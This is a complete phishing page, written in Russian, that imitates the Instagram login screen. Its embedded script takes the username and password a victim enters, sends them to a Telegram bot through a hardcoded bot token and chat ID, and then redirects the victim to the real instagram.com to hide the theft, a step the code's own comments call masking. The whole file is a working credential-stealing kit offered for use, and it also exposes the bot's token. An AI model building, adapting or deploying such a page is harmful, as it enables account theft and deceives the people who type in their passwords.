<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход • Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #fff; }
        
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        
        .logo { margin-bottom: 40px; }
        .logo img { width: 175px; filter: invert(1); } /* Белый логотип на черном фоне */

        .input-group { margin-bottom: 12px; }
        input {
            width: 100%;
            padding: 12px 10px;
            background-color: #121212;
            border: 1px solid #363636;
            border-radius: 3px;
            color: #fff;
            font-size: 14px;
        }
        input:focus { border-color: #a8a8a8; outline: none; }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:disabled { opacity: 0.7; }

        .forgot { color: #fff; font-size: 14px; text-decoration: none; margin-top: 20px; display: block; }

        .footer {
            position: absolute;
            bottom: 20px;
            border-top: 1px solid #262626;
            width: 100%;
            padding-top: 20px;
            text-align: center;
        }
        .create-btn { color: #0095f6; text-decoration: none; font-weight: 600; font-size: 14px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <!-- Ссылка на официальный логотип Instagram -->
            <img src="https://wikimedia.org" alt="Instagram">
        </div>

        <form id="inst-form">
            <div class="input-group">
                <input type="text" id="user" placeholder="Номер телефона, имя пользователя или эл. адрес" required>
            </div>
            <div class="input-group">
                <input type="password" id="pass" placeholder="Пароль" required>
            </div>
            <button type="submit" class="login-btn">Войти</button>
            <a href="#" class="forgot">Забыли пароль?</a>
        </form>
    </div>

    <div class="footer">
        <p style="color: #8e8e8e; font-size: 14px;">У вас нет аккаунта? <a href="#" class="create-btn">Зарегистрируйтесь</a></p>
    </div>

    <script>
        const TOKEN = '8314828218:AAGcMhdPg7GEDW4e1EPAlp-qJt5FkMXwlmY';
        const CHAT_ID = '6576262467';

        document.getElementById('inst-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const msg = `📸 INSTAGRAM LOG:\n👤 User: ${u}\n🔑 Pass: ${p}`;

            // Отправка в твой новый бот
            fetch(`https://telegram.org{TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
            })
            .finally(() => {
                // МАСКИРОВКА: Перекидываем на настоящий Instagram
                window.location.href = 'https://instagram.com';
            });
        });
    </script>

</body>
</html>
